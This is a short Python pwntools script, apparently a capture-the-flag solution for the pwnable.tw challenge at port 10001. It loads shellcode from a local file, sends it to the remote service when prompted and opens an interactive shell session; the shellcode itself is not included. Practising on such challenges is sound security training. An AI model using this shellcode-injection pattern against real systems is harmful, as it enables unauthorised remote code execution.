#!/usr/bin/env python
from pwn import *

r = remote('chall.pwnable.tw', 10001)

sh = open('sh', 'rb').read()
print len(sh)
print disasm(sh)

r.recvuntil('Give my your shellcode:')
r.sendline(sh)

r.interactive()

